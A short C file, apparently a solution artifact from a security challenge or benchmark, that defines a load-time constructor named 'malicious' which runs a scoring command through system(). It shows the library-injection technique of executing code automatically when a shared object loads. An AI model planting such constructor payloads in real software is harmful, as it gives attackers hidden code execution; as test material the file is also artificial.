#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score dfdc1e9b-f526-40c1-8842-68807cfa494b");
}
